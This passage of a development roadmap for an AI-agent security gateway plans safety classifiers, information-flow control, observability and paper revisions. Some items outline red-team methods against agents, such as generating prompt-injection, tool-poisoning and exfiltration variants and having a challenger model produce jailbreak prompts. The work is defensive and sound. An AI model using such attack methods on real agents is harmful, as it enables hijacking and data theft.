| AgentSwing (2603.27490) | 10b (context compaction) |
| BLD (2604.07466) | 10b (cross-tokenizer distillation) |
| Goose | 10a (unsecured baseline) |
| OpenShell | 10a (defense in depth) |
| Kaiden | 10a (sandboxing patterns) |
| AWS Agent Registry | 10b (governance layer) |
| Claude Code Review | 10a, 10c (cross-validation) |
| Strands / RTK | 10b (context compression) |
| CodeAct | 10b (plan_execute) |
| AutoData | 10a (adversarial eval, if 11c done) |
| LangChain | 10a, 10c (Worker/Leader convergence) |
| ZeroClaw | 10a (Rust competitor baseline) |
| OWASP Top 10 for LLM | 10a (threat model) |
| OWASP ASI 2026 | 10a (agentic threat taxonomy) |
| EU AI Act Article 14 | 10a (compliance) |
| NVIDIA Vera Rubin | 10b (agentic token economics, 15x multiplier) |
| OpenAI Privacy Filter | 10a (PII detection, if 11d done) |
| Vercel DeepSec | 10a, 10c (AI security scanning, multi-stage pattern) |
| FIDES (arXiv:2505.23643) | 10a (IFC competitor, expanded differentiation) |
| MVAR dual-lattice IFC | 10a (IFC competitor, execution firewall) |
| NeuroTaint (arXiv:2604.23374) | 10a (semantic taint, F1=0.928 vs label-only) |
| Shadow Escape (Operant AI) | 10a (zero-click MCP attack, validates gateway) |
| MCP 2026-07-28 RC | 10a (stateless protocol redesign) |
| auth.md (WorkOS) | 10a (agent registration protocol) |
| K8s Agent Sandbox CRD | 10a (isolation infrastructure) |
| MUSE-Autoskill (2605.27366) | 10b (skill lifecycle management) |
| MemForest (2605.23986) | 10b (hierarchical temporal memory) |
| Claw-Anything (2605.26086) | 10c (always-on benchmark) |
| Cloudflare Agent Memory | 10b (5-channel RRF validation) |
| gBrain (Garry Tan) | 10b (zero-LLM graph extraction) |
| Hermes Agent (Nous Research) | 10b (consumer agent framework) |
| TurboVec / TurboQuant (2504.19874) | 10b (vector quantization) |
| Skill Consumption (2605.23899) | 10b (negative transfer) |

### Phase 11: Model & safety research (from tech watch 2026-05-06)

Research-driven items that require evaluation before committing
to implementation. Each item has a research gate.

#### 11a. ONNX/ort deepening

**Crates**: `navra-model` (OnnxBackend), `navra-model-runtime`

Track and contribute to the ONNX/ort-rs ecosystem:

- RDT (Recurrent Depth Transformer) loop/recurrence operators
  in ONNX — required to run RDT models in-process
- ort-rs GenAI API bindings: KV cache management, buffer sharing
  for efficient autoregressive generation
- Moshi/KAME ONNX export viability (see 11b)

**Effort**: Research + upstream PRs. **Priority**: Medium.
**Gate**: Are RDT operators merged in ONNX spec? Is ort-rs GenAI
API stable enough to depend on?

#### 11b. KAME tandem voice architecture

**Crate**: `navra-modal-voice`

Evaluate Moshi-based speech-to-speech as replacement for the
current cascaded ASR → LLM → TTS pipeline:

- Tandem: fast S2S front-end + oracle stream from LLM back-end
- Latency target: <500ms first-byte (vs ~2s cascaded)
- Requires ONNX export of Moshi encoder/decoder (see 11a)
- Evaluate against current Whisper + Piper cascade

**Effort**: Research. **Priority**: Medium.
**Gate**: Is Moshi exported to ONNX? Does latency improve in
practice on our hardware (RTX 5090)?

#### 11d. PII redaction via ONNX token classifier (NEW)

**Crate**: `navra-security` (new `pii_ner_hook.rs`)

Evaluate OpenAI's `privacy-filter` model as an additional PII
detection layer alongside the existing regex + ProtectAI NER:

- Standard `AutoModelForTokenClassification` (HuggingFace)
- 8 PII categories: names, emails, phones, addresses, account
  numbers, secrets, dates, URLs
- BIO tagging with configurable confidence threshold (default 0.50)
- Typed redaction masks: `[PRIVATE_EMAIL]`, `[PRIVATE_PHONE]`, etc.
  (more informative than current `[REDACTED:category]`)

**Implementation as SafetyHook:**
- Export model to ONNX (standard transformers → ONNX pipeline)
- Load in-process via OnnxBackend (same as ProtectAI models)
- Wire as `PiiRedactionHook` in the hook pipeline (pre-call for
  outbound content, post-call for inbound results)
- Reverse-order span replacement preserves index accuracy

**Research gate**: Is the model ONNX-exportable without quality
loss? How does it compare to ProtectAI on our test cases?

**Effort**: 1-2 days (eval) + 1 day (integration). **Priority**: Medium.
**Acceptance**: Model runs in-process, detects PII categories that
regex misses, <50ms latency on typical tool outputs.

Reference: OpenAI Privacy Filter pipeline (2026-04-29).

#### 11f. GLiGuard safety model evaluation ✅

**Crate**: `navra-security` (safety classifier)

Evaluate GLiGuard (Fastino Labs, `fastino/gliguard-LLMGuardrails-300M`,
Apache 2.0) as upgrade/replacement for the current binary ML safety
classifier. GLiGuard reframes safety as encoder-based classification:

- **Performance**: 87.7 F1 on prompt classification, 82.7 F1 on
  response classification — matches LlamaGuard4-12B (23x larger)
  and ShieldGemma-27B (90x larger)
- **Speed**: 26ms latency on A100 vs 426ms for decoder models (16x)
- **Multi-label**: Single forward pass classifies safety (safe/unsafe),
  jailbreak strategy (11 types), harm category (14 types), and
  refusal detection — no latency increase for more labels
- **ONNX ready**: Already benchmarked under ONNX CUDA FP16 and
  ONNX TensorRT, 193.6 req/s with dynamic batching

**Compact variant**: GLiNER Guard (145-147M) for CPU-only deployments.
Authors recommend tiered moderation: compact encoder for high-volume
traffic, heavier model for uncertain inputs.

**Implementation**:
1. Export GLiGuard ONNX and test on Lunar Lake NPU/iGPU (300M
   params should fit comfortably)
2. Extend `ClassifyResponse` to multi-label output (harm categories,
   jailbreak type, refusal) beyond current binary safe/unsafe
3. Update `FilterPipeline` for tiered moderation: regex (tier 0) →
   GLiGuard compact 145M (tier 1) → heavier model for uncertain
   cases (tier 2)
4. Add verbosity scoring to `StatisticalGuardrailHook` — readability
   index as cheap hallucination proxy (KDNuggets research)

Also track: Qwen3Guard 8B tri-class pattern (safe/controversial/unsafe)
maps to navra's configurable safety profiles.

**Research gate**: Does GLiGuard ONNX export run on OpenVINO EP?
How does it perform on adversarial prompts (Qwen3Guard showed 57-point
gap between public and adversarial prompts)?

**Effort**: 1-2 days (eval) + 1 day (multi-label integration).
**Priority**: High.
**Acceptance**: Multi-label safety classification in <30ms on NPU,
F1 ≥ 85 on standard benchmarks.

Reference: GLiGuard (Fastino Labs, 2026-05-13), GLiNER Guard
(arXiv:2605.05277), PolyGuard-Qwen, Qwen3Guard.

#### 11g. Speculative decoding in model-runtime (NEW — tech watch 2026-05-17)

**Crate**: `navra-model-runtime`

Add EAGLE3/FastDraft speculative decoding to the OpenVINO execution
path. A small draft model (0.5-1B) generates candidate tokens, the
main model (7-8B) verifies in parallel:

- OpenVINO 2026.1 supports EAGLE3-based speculative decoding with
  INT4 draft models natively
- FastDraft achieves up to 3x speedup on edge devices
- Minimal memory overhead: draft model is INT4, ~500MB
- Applicable to the Lunar Lake 268V NPU/GPU pipeline

**Effort**: 2-3 days. **Priority**: Medium.
**Gate**: Is EAGLE3 support stable in OpenVINO 2026.1?
**Acceptance**: 2x+ speedup on 7B model inference on 268V vs
non-speculative baseline.

Reference: OpenVINO speculative decoding docs, FastDraft (Intel).

#### 11n. model-runtime dimension refactor (NEW — 2026-05-29)

**Crate**: `navra-model-runtime`, `navra-server`

Extract 3 hidden orthogonal axes from the Engine×Isolation product.
Currently hardware target, model format, and execution mode are
tangled into `Engine` methods, `ServeConfig` fields, and server
`main.rs` match arms. Each axis should be an independent enum so
that adding a third engine (SGLang, TensorRT-LLM) or hardware
target (NPU) doesn't multiply scattered match blocks.

**Dimension 1 — HardwareTarget** `{Cpu, Nvidia, Amd, Intel}`:
New `hardware.rs`. Centralizes `select_image()`, podman GPU
device passthrough (`podman.rs:87-104`), OpenShell GPU labels
(`openshell.rs:101-108`), and `requires_gpu()` compatibility
checks. `ServeConfig` gets `target: HardwareTarget`.

**Dimension 2 — ModelFormat** `{Gguf, Safetensors, Awq, Gptq}`:
New `format.rs`. Adds `detect(path)`, `Engine::supports_format()`,
and `Engine::best_for_format(format, target)` — replaces the
engine-first selection logic in `auto_runtime()`.

**Dimension 3 — ExecutionMode** `{InProcess, Served}`:
Separates model purpose (embedding/chat) from execution strategy.
`ExecutionMode::from_task()` preserves current defaults; operator
can override (e.g., serve embeddings via vLLM). Replaces the
`match task` dispatch in `main.rs:934+`.

**Execution order**: HardwareTarget → ModelFormat → ExecutionMode
(each depends on the previous).

**Effort**: 1-2 days (mostly moving code, not writing new logic).
**Priority**: High.
**Acceptance**: All existing tests pass. Each dimension has its
own unit tests. `RuntimeBackend` enum unchanged. No new features
— pure structural refactor.

Detailed plan: `.claude/plans/elegant-percolating-frog.md`

#### 11h. Gateway-level cost-aware routing ✅

**Crate**: `navra-security` (new `routing_hook.rs`) +
`navra-model` (backend selection)

Add a `RoutingHook` that classifies prompts and routes to
appropriate model tiers, transparent to agents:

- **Classification**: In-process ONNX classifier (MiniLM or
  ModernBERT) runs on each prompt, ~10ms. Classifies
  simple/complex/agentic tiers
- **Routing policy**: Configurable per-agent or per-session
  (eco/balanced/premium). Maps tiers to model backends in config
- **Cascading**: Low-confidence classifications escalate to
  premium models. Self-consistency checks (generate twice,
  escalate on disagreement) for critical operations
- **Session pinning**: Multi-turn stays on one model to avoid
  context fragmentation

Validated by:
- **vLLM Semantic Router** (Red Hat, Rust+Candle): 47% latency
  reduction, 48% token reduction, 10% accuracy improvement
- **NadirClaw**: 40-70% cost reduction with MiniLM centroid routing
- **RouteLLM** (Berkeley/LMSYS): 85% cost reduction on MT Bench

Reuses existing infrastructure: ONNX runtime (already loaded for
safety), hook pipeline, model backend trait.

**Effort**: 3-4 days. **Priority**: Medium-High.
**Acceptance**: Simple prompts routed to cheap model, complex to
premium, with measurable cost reduction and no quality loss.

Reference: vLLM Semantic Router (Red Hat), NadirClaw, RouteLLM
(Berkeley), R2-Router (UIUC).

#### 11i. delta-mem OSAM evaluation (NEW — tech watch 2026-05-25)

**Crate**: `navra-model-runtime` (evaluation)

Evaluate delta-mem's Online State of Associative Memory (OSAM) as
a working memory mechanism for locally-served small models:

- **OSAM**: Fixed-size matrix dynamically updated with each
  interaction. Acts as compressed working memory that persists
  across turns. Adds only 0.12% of backbone parameters.
- **Target model**: Granite-3.2-3B on Lunar Lake 268V NPU.
  delta-mem achieved 51.66% on Qwen3-4B-Instruct (vs 46.79%
  frozen baseline).
- **Working memory vs RAG**: delta-mem handles intra-session
  working memory (active context management). navra-memory's
  FTS5+sqlite-vec handles cross-session retrieval. Complementary,
  not competing.
- **Integration path**: If evaluation is positive, add OSAM
  matrix to the model serving layer. The LLM backbone stays
  frozen; only the OSAM matrix is learned/updated.

**Effort**: 2 days (eval). **Priority**: Medium.
**Gate**: Does OSAM integrate with ONNX runtime? What's the
quality impact on Granite-3.2-3B vs Qwen3-4B?
**Acceptance**: Measurable improvement on multi-turn tool-calling
tasks with Granite-3.2-3B + OSAM on NPU.

Reference: delta-mem (Mind Lab, VentureBeat 2026-05-21),
Memory Agent Bench.

#### 11j. Harness-aligned training data generation (NEW — tech watch 2026-05-25)

**Crate**: `navra-model-runtime` (training data)

Generate fine-tuning training data using navra's actual tool
schemas and MCP message format, following MagenticBrain's
harness-aligned training methodology:

- **Training data format**: Multi-step tool-calling trajectories
  using navra tool definitions (not generic function-calling
  examples). Include navra-specific message format, tool
  annotations, and IFC labels.
- **Dual-trajectory**: Combine (a) tool-calling trajectories and
  (b) coding/terminal trajectories. The model learns when to call
  a tool vs when to write code.
- **Delegation examples**: Include explicit "hand off to specialist"
  trajectories. The orchestrator learns when not to act.
- **Three-gate verification**: Correctness (LLM rubrics) +
  efficiency (token/iteration penalty) + user-interaction
  verification. Reject training examples that fail any gate.
- **Target**: Granite models for navra-specific fine-tuning.
  MagenticBrain proves this eliminates the train/deploy gap.

**Effort**: Research + data generation. **Priority**: Medium.
**Gate**: Is the training data quality sufficient? Does harness-
aligned Granite outperform generic Granite on navra tasks?
**Acceptance**: Fine-tuned Granite model achieves higher tool-call
accuracy on navra-specific tasks than base model.

Reference: MagenticLite/MagenticBrain (Microsoft Research),
Fara1.5 FaraGen1.5 synthetic data pipeline.

#### 11k. IFC cryptographic witness for declassification (NEW — tech watch 2026-05-28) ✅ (2026-05-29)

**Crate**: `navra-security` (ifc)

Add cryptographic witness to declassification operations. Currently
`TaintTracker::declassify()` exists but without formal verification.
Gap exposed by FIDES (formal information-hiding primitives) and MVAR
(cryptographic provenance):

- **Witness record**: Each declassification produces a signed record
  containing: original label, new label, declassifier identity,
  timestamp, justification. Signed with Ed25519 (reuse existing
  capability token signing infrastructure).
- **Audit trail**: Witnesses appended to blackbox audit log. Enables
  post-hoc verification that all declassifications were authorized.
- **Role-based gates**: Only specific roles (configured per-agent)
  can trigger declassification. Prevents implicit trust escalation.

FIDES's information-hiding primitives are the reference design.
navra's advantage is gateway-level enforcement (can't be bypassed
by LLM reasoning).

**Effort**: 2-3 days. **Priority**: Medium-High.
**Acceptance**: Every declassification produces a verifiable signed
witness. Unauthorized declassification attempts are rejected.

Reference: FIDES (Microsoft Research, arXiv:2505.23643), MVAR
cryptographic provenance.

#### 11l. IFC adversarial corpus benchmark (NEW — tech watch 2026-05-28)

**Crate**: `navra-security` (tests)

Benchmark navra-security's IFC against MVAR's adversarial corpus
and the NeuroTaint TaintBench:

- **MVAR corpus**: 50-vector adversarial corpus across 9 attack
  categories. MVAR claims 100% block rate. Establish navra's
  baseline.
- **TaintBench**: 400 scenarios across 20 agent frameworks. FIDES
  achieves F1=0.522, NeuroTaint achieves F1=0.928. navra's
  per-value IFC + statistical guardrails should fall between these.
- **AgentDojo**: FIDES's primary evaluation benchmark. Run navra's
  IFC on AgentDojo for direct comparison.
- **Gap analysis**: Identify which attack categories navra's
  label-only IFC misses (semantic transformation, causal influence,
  cross-session contamination).

**Effort**: 3-5 days. **Priority**: Medium.
**Gate**: Are MVAR corpus and TaintBench publicly available?
**Acceptance**: navra IFC block rate > 90% on MVAR corpus.
F1 measured on TaintBench.

Reference: MVAR (github.com/mvar-security/mvar), NeuroTaint
(arXiv:2604.23374), FIDES AgentDojo evaluation.

#### 11m. NeuroTaint offline taint audit (NEW — tech watch 2026-05-28)

**Crate**: `navra-security` (new `taint_audit.rs`)

Implement offline semantic taint analysis inspired by NeuroTaint.
navra's inline label-only IFC (FIDES-class, F1~0.522) is
insufficient for semantic attacks. NeuroTaint's F1=0.928 comes from
three mechanisms navra lacks:

- **Semantic transformation tracking**: Detect meaning-preserving
  transformations (paraphrase, summarization) that bypass label
  tracking. Use embedding similarity on tool inputs/outputs across
  sessions.
- **Causal influence detection**: Identify how untrusted data
  influences agent decisions without direct content transfer. Analyze
  decision-point traces in the blackbox audit log.
- **Cross-session memory contamination**: Monitor navra-memory's
  knowledge store for taint propagation across sessions. Detect
  when tainted data persists and influences future queries.
- **Offline operation**: Analyze OTel traces and blackbox audit logs
  post-hoc. Zero inline latency overhead. Run on schedule or
  on-demand.

**Effort**: 5-7 days. **Priority**: Medium.
**Gate**: Does offline semantic analysis achieve measurable
improvement on TaintBench over inline-only IFC?
**Acceptance**: Offline audit detects semantic taint that inline
IFC misses. F1 improves from baseline.

Reference: NeuroTaint (arXiv:2604.23374), FIDES comparison.

#### 11c. Adversarial safety evaluation

**Crates**: `navra-security` (safety classifier),
`navra-flow` (pipeline orchestration)

Generate adversarial training data for the safety classifier
using AutoData's Challenger/Weak/Strong/Verifier pattern:

- Challenger generates adversarial prompts targeting specific
  safety categories (jailbreak, PII extraction, prompt injection)
- Weak model produces naive responses
- Strong model produces robust responses
- Verifier scores both; delta becomes training signal
- Orchestrated as a `navra-flow` DAG (4 specialists)

**Effort**: 3-5 days. **Priority**: Medium.
**Depends on**: Flow engine (Phase 2), safety classifier (done).
**Acceptance**: Safety classifier F1 improves on held-out test
set after fine-tuning on generated data.

#### 11e. Statistical guardrails for SafetyHook (NEW)

**Crate**: `navra-security` (new `statistical_hook.rs`)

Add statistical methods alongside regex and ML safety filters,
inspired by two complementary techniques:

- **Semantic drift detection**: Embed agent output, compute cosine
  distance to baseline context, z-score flags statistical outliers.
  High z-score = response drifted off-topic or into unsafe territory.
  Baseline built from per-session context window (moving average of
  recent embeddings).
- **Confidence thresholding**: Shannon entropy on model output token
  distribution detects uncertainty / likely hallucination. High
  entropy = model is guessing. Requires logprobs from model backend
  (available in llama-server, vLLM, OpenAI-compat).

Both are lightweight (<5ms per check with cached embeddings) and
complement the existing regex + ONNX classifier pipeline:

| Layer | Method | Catches |
|-------|--------|---------|
| Regex | Pattern matching | Known-bad content (SSN, profanity) |
| ONNX classifier | ML classification | Trained categories |
| Cosine z-score | Statistical drift | Off-topic, jailbreak steering |
| Shannon entropy | Confidence check | Hallucination, uncertainty |

Wire as `StatisticalGuardrailHook` in the hook pipeline (post-call).
Configurable thresholds per persona (creative personas tolerate
higher drift).

**Effort**: 2-3 days. **Priority**: Medium-High.
**Acceptance**: Detects prompt injection that steers agent off-topic
where regex misses it. <5ms latency overhead.

Reference: Machine Learning Mastery statistical guardrails
(2026-05-06), tech watch 2026-05-08.

### Phase 12: Observability & infrastructure debt

Items collected from Code Health, self-review findings, DESIGN.md
gaps, and audit metrics gaps. Grouped into sub-phases by area.

#### 12a. Flow audit completeness ✅ (2026-05-26)

**Crate**: `navra-server/src/flow_tools.rs`, `navra-agent`

Fix 8 metrics gaps that prevent accurate paper evaluation:

1. **Per-task duration**: `record_task_results_to_audit` sets
   `started_at = completed_at`. Fix: capture start time when
   task is spawned, end time when result is collected.
2. **Per-task iterations**: always NULL. Fix: parse `iterations`
   from containerized agent JSON output and store.
3. **Per-task tokens**: cumulative not per-task. Fix: record
   delta or per-agent token count.
4. **Resolved model name**: stored as "auto". Fix: record the
   model selected by `select_model_for_task`.
5. **audit_tool_calls**: empty. Fix: wire `AuditLog::record_tool_call`
   into the agent tool loop for flow agents.
6. **audit_model_calls**: empty. Fix: same as above for model calls.
7. **GPU utilization sampling**: no recording. Fix: periodic
   `nvidia-smi` sampling during flow execution.
8. **Structured finding format**: specialists output free-text.
   Fix: define JSON schema for findings with severity, file, line,
   category fields.

**Effort**: 3-4 days. **Priority**: High (blocks papers).
**Acceptance**: Rerun comparative flows, all 8 columns populated.

#### 12d. navra-flow DAG test framework ✅

**Crate**: `navra-flow` (new `validation/` module)

Structural validation for non-deterministic flow execution,
beyond unit tests and formal proofs. Adapts GitHub's Prefix
Tree Acceptor / dominator analysis approach:

- **Capture**: Record 2-10 successful flow execution traces
  (agent states, tool calls, outputs at each DAG node).
- **Generalize**: Merge traces into a PTA using semantic
  equivalence (cosine similarity on node outputs, configurable
  threshold).
- **Extract dominators**: Apply compiler-theory dominator analysis
  to identify essential states every successful path must traverse.
  These are the mandatory milestones regardless of routing variation.
- **Validate**: New executions pass if they contain all dominator
  states in topological order, regardless of incidental variation
  (extra tool calls, different specialist ordering).

This addresses a real gap: flow execution is non-deterministic
(model routing, handoff decisions, back-edge conditions), so
exact-match testing is brittle. Dominator extraction gives
stable invariants.

GitHub measured 100% accuracy vs 82% self-assessment with this
approach.

**Effort**: 3-4 days. **Priority**: Medium.
**Depends on**: 12a (flow audit completeness — needs trace data).
**Acceptance**: Validate that a review flow always passes through
scout → planner → specialist stages regardless of which
specialists are selected.

Reference: GitHub "Validating Agentic Behavior" (2026-05-08),
Prefix Tree Acceptors, dominator analysis.

#### 12e. Trajectory-level evaluation ✅ (2026-05-26)

**Crate**: `navra-flow` (eval.rs)

Extend the existing `RunMetrics` and `EvalSummary` with trajectory-
level evaluation inspired by NVIDIA's agent evaluation framework:

- **Task Success Rate (TSR) per scenario**: Tag evaluations with
  scenario type (normal, degraded tools, ambiguous instructions).
  Current `EvalSummary` only does aggregate precision.
- **Tool call accuracy**: Right tool chosen vs available tools.
  The `ActionRecord` already captures tool calls — add scoring.
- **Trajectory efficiency**: Tokens consumed per successful task.
  Report as `tokens_per_success` alongside existing
  `tokens_per_finding`.
- **Failure mode classification**: Categorize failures as
  plan_failure, tool_failure, environment_failure, verification_
  failure. Distribution analysis reveals systemic weaknesses.
- **Tool budget compliance**: The `ToolLoopConfig` already has
  `max_iterations` and `max_tokens_per_run`. Report compliance
  rate ("95% of tasks completed under N tool calls").

Industry data: 37% gap between lab benchmarks and real-world
deployment. Agent success drops from 60% single-run to 25% across
8 runs. These metrics catch that brittleness.

**Effort**: 2-3 days. **Priority**: Medium.
**Acceptance**: Eval output includes scenario-tagged TSR, trajectory
efficiency, and failure mode distribution.

Reference: NVIDIA Mastering Agentic Techniques (2026-05),
DeepEval agentic metrics, Galileo agent evaluation framework.

#### 12f. RAMPART-style safety test suite ✅ (2026-05-26)

**Crate**: `navra-security` (tests)

Build an automated red-team test suite for navra's safety filters,
inspired by Microsoft RAMPART:

- **Variant generation**: For each known attack vector (prompt
  injection, tool poisoning, credential exfiltration), generate
  100+ variants using template substitution and paraphrasing.
- **Statistical thresholds**: "This filter must block ≥80% of
  variants across N=100 runs" — accounts for probabilistic model
  behavior.
- **CI integration**: Run as part of `cargo test` with feature
  flag `safety-bench`. Regression tests for every safety fix.
- **Attack categories**: Cross-prompt injection (highest priority —
  agents processing poisoned content), tool description injection,
  imperative overrides, credential leakage, exfiltration URLs.
- **NIST finding**: Tailored attacks raise task-hijacking from 11%
  to 81% ASR. Generic safety filters are insufficient — tests
  must be crafted for navra's specific architecture.

**Effort**: 2-3 days. **Priority**: Medium-High.
**Acceptance**: Safety filter regression suite with 500+ variants
across 5 attack categories. CI green on all.

Reference: Microsoft RAMPART (2026-05-20), Dreadnode SDK
(arXiv 2605.04019), NIST AI RMF Playbook (2026-03).

#### 12b. Infrastructure debt (MEDIUM)

Collected from Code Health, self-review findings, and DESIGN.md:

| Item | Source | Effort |
|------|--------|--------|
| Session store sharding (DashMap) | Self-review perf-01 | 1-2 days |
| Streaming model download | Self-review code-03 | 2-3 days |
| Upstream TLS | DESIGN.md gap | 2-3 days |
| Feature-gate ONNX | Code Health | Invasive |
| Convert tools to `#[tool]` macro | Phase 9h | 2 days |
| Sync ureq → async in authenticator | Self-review sec-01 | 1 day |
| fd-passing TOCTOU mitigation in file tools | AWS REX (2026-05-08) | 1-2 days |

#### 12c. Observability ✅ (2026-05-26, Prometheus + OTel)

**Upgraded from LOW to HIGH**: All competing MCP gateways (Lunar MCPX,
MintMCP, Kong, Bifrost) now advertise OTel traces + Prometheus metrics.
78% enterprise adoption. This is no longer optional — it's competitive
table-stakes.

**Standard**: OpenTelemetry GenAI semantic conventions (OTel GenAI SIG,
experimental since April 2024). The agentic extension (Issue #2664)
adds Execute Tool span type. All major agent frameworks (OpenAI Agents
SDK, LangChain, LlamaIndex, AutoGen) shipped OTel emitters by Q1 2026.

**Implementation**:

1. **`tracing-opentelemetry` in navra-core**: Emit spans using
   `gen_ai.*` semantic conventions for every tool call transiting
   the gateway. Use Execute Tool span type from agentic conventions.
2. **Hook pipeline as span tree**: Each hook (auth, permission,
   safety, budget) becomes a child span with duration and result
   attributes (`navra.permission.result`, `navra.safety.result`).
3. **Prometheus `/metrics` endpoint**: Expose gateway-specific
   counters (see below).
4. **Structured audit events**: OTel log events for every permission
   check, safety filter decision, deny-wins ACL activation.
   Satisfies SOC 2/GDPR compliance without a separate audit system.

**Security-specific metrics** (unique to navra — no proxy gateway
can compute these):

| Metric | What it measures |
|--------|-----------------|
| `navra.permission.denial_rate` | Per-tool, per-agent permission denials |
| `navra.safety.filter_trigger_rate` | Safety hook triggers by category |
| `navra.safety.filter_latency_p95` | ONNX inference time for safety |
| `navra.acl.deny_wins_count` | Deny-wins ACL activations |
| `navra.hook.pipeline_duration` | Total hook pipeline execution time |
| `navra.tool.execution_success_rate` | Per-tool success rate (>0.98 threshold) |
| `navra.session.tool_call_count` | Tool calls per session (runaway loop detection) |
| `navra.guardrail.anomaly_score` | Statistical deviation from baseline patterns |

**Backend choice**: navra emits OTel-compatible spans + Prometheus
counters. Operators choose their backend (Phoenix, Langfuse,
Datadog, Grafana). OpenLLMetry-style instrumentation for portability.

**EU AI Act compliance**: Fully enforceable August 2026. Requires
comprehensive logging and traceability for high-risk AI systems.
OTLP export is now a regulatory requirement, not just competitive
table-stakes. ClawPatrol already ships OTLP telemetry export.

**Effort**: 3-4 days. **Priority**: P0 — Critical (regulatory).
**Acceptance**: Tool calls visible in any OTel-compatible backend
with security decision attributes. Prometheus endpoint scraped
by standard monitoring.

Reference: OTel GenAI semantic conventions, 12-metric evaluation
framework (TDS), OpenLLMetry, Arize Phoenix, MintMCP enterprise
requirements, ClawPatrol OTLP export, EU AI Act Article 14.

### Phase 13: Peer review readiness (2026-05-07 review)

Findings from a comprehensive academic review (5 specialized research
agents covering MCP security landscape, orchestration, memory/RAG,
privacy/compliance, and paper positioning). The landscape moved faster
than the documentation reflects — several claims that were novel in
late 2025 are now contested.

**Genuine differentiators** (confirmed unique after review):
1. Gateway-enforced IFC (vs FIDES planner-enforced)
2. IFC-gated inter-agent messaging (no orchestration framework does this)
3. PII cascade into vector embeddings with IFC taint elevation
4. Capability tokens + IFC + ring enforcement in single gateway

#### 13a. Critical (blocks paper submission)

| ID | Issue | Detail | Effort |
|----|-------|--------|--------|
| C1 | **FIDES differentiation** | Microsoft Research arXiv:2505.23643 (May 2025) does IFC for agents with formal proofs. Must expand from 1 sentence to full paragraph: gateway-enforced (navra) vs planner-enforced (FIDES). Failure to cite prominently = fatal at security venues. | 0.5 day |
| C2 | **10+ competing MCP gateways** | Gravitee 4.10, Microsoft MCP Gateway, Traefik Hub, Kong 3.13, MintMCP (SOC2 Type II), Lunar.dev, Composio, Intercept, systemprompt-template. "No existing gateway provides security" is false as of May 2026. Position on IFC/capability tokens, not on being a gateway. | 0.5 day |
| C3 | **External evaluation** | Self-evaluation on own codebase is circular. Run on c-CRAB benchmark (code review), 5+ OSS projects, 3+ trials with statistical significance. Primary eval must be external; self-review becomes appendix case study. | 3-5 days |
| C4 | **Compliance framing** | EU AI Act Article 14 applies to high-risk AI systems (Annex III), not infrastructure gateways. Reframe all claims: "compliance infrastructure" not "compliance." SOC2/ISO 42001 similarly. | 0.5 day |
| C5 | **Microkernel analogy** | AIOS (COLM 2025, arXiv:2403.16971) and Agent-OS (2025) already use "microkernel" for agents. Either cite and differentiate, or switch to "security reference monitor" (more precise, less contested). | 0.5 day |
| C6 | **Paper 1 scope** | 8 contributions screams "systems paper disguised as security." Narrow to 3: gateway-enforced IFC, capability delegation with attenuation, hash-chained audit. Drop PII (table stakes), containers, typed actions, OAuth (a standard). | 1 day |

#### 13b. Significant (weakens credibility)

| ID | Issue | Detail | Effort |
|----|-------|--------|--------|
| S1 | Tool classification | `is_write_tool` uses substring matching ("write", "commit"). Use MCP tool annotations (`destructiveHint`, `readOnlyHint`) instead. | 1 day |
| S2 | Formal security invariants | FIDES has formal proofs. Add at least informal security invariants for IFC properties. | 1-2 days |
| S3 | HyDE stub | Listed as feature in 6-channel retrieval. Code returns empty. Either implement or remove from claims. | 1 day |
| S4 | Memory decay rate | Flat 0.001 for all entries. FadeMem (arXiv:2601.18642) and YourMemory use importance-modulated rates. Minimal code change. | 0.5 day |
| S5 | Sentence splitting | `split_at_sentences` falls back to fixed-interval (acknowledged in comment). Use tree-sitter for code-heavy workloads. | 1 day |
| S6 | EU identifier gap | Claims SIRET/passport regex but code only has IBAN/NIR. NER covers some via sfermion labels. Fix docs or add patterns. | 0.5 day |
| S7 | PII benchmarks | No F1/precision/recall on any standard benchmark. OpenAI Privacy Filter achieves F1 0.96-0.97. Run on a PII benchmark. | 1-2 days |
| S8 | Token revocation | Capability tokens have expiry/nonces but no revocation. DRS and Grantex emphasize this. | 1 day |
| S9 | Statistical significance | 3.5x efficiency from N=1 run. Need 3+ projects, 3+ runs each, confidence intervals. | 2-3 days |
| S10 | Pseudonym key separation | PseudonymMap reversal key in same process memory. GDPR Article 32 expects separate security domain. | 1 day |

#### 13c. Missing related work (consolidated)

| Reference | Paper | Priority |
|-----------|-------|----------|
| FIDES (arXiv:2505.23643, Microsoft Research) | 1, 2 | **Must cite** |
| AIOS (arXiv:2403.16971, COLM 2025) | 1 | **Must cite** |
| Agent-OS (2025, zero-trust microkernel) | 1 | **Must cite** |
| Gravitee / Kong / Traefik MCP gateways | 1 | **Must cite** |
| OWASP Top 10 for Agentic Applications 2026 | 1 | **Must cite** |
| CoSAI OASIS MCP Security document | 1 | **Must cite** |
| Block "Operation Pale Fire" red team | 1 | Should cite |
| A2ASECBENCH (ICLR 2026) | 1 | Should cite |
| 193-threat taxonomy (arXiv:2603.09002) | 1 | Should cite |
| Open Challenges MAS Security (arXiv:2505.02077) | 1 | Should cite |
| c-CRAB benchmark (arXiv:2603.23448) | 3 | **Must cite** |
| CodeAgent (EMNLP 2024) | 3 | **Must cite** |
| Code Broker (arXiv:2604.23088) | 3 | **Must cite** |
| MorphAgent (arXiv:2410.15048) | 2 | Should cite |
| Graph Harness (arXiv:2604.11378) | 2, 3 | Should cite |
| FadeMem (arXiv:2601.18642) | 2 | Should cite |
| Mem0 (graph + vector + KV hybrid memory) | 2 | Should cite |
| Microsoft AGT (agent-governance-toolkit) | 1 | **Must cite** |
| GLiGuard / GLiNER Guard (arXiv:2605.05277) | 1 | **Must cite** |
| PoA: Authenticated Delegation (arXiv:2501.09674) | 1 | Should cite |
| OTel GenAI semantic conventions (SIG) | 1 | Should cite |
| vLLM Semantic Router (Red Hat, Rust) | 1, 2 | Should cite |
| ACON agent-specific compression (ICLR 2026) | 2 | Should cite |
| Memori agent memory (MemoriLabs) | 2 | Should cite |
| DBOS durable execution | 2 | Should cite |
| Zep/Graphiti temporal knowledge graph | 2 | Should cite |
| Claw-Eval-Live workflow benchmark (CUHK) | 3 | Should cite |
| SkillOS skill curation (Google Cloud AI) | 2 | Should cite |
| NanoResearch tri-level co-evolution (2605.10813) | 2 | Should cite |
| LIFE Framework MAS survey (2605.14892) | 2 | Should cite |
| HASP Program Functions (2605.17734) | 1, 2 | **Must cite** |
| SDB formalization (2605.20173) | 1, 2 | **Must cite** |
| delta-mem OSAM (Mind Lab) | 2 | Should cite |
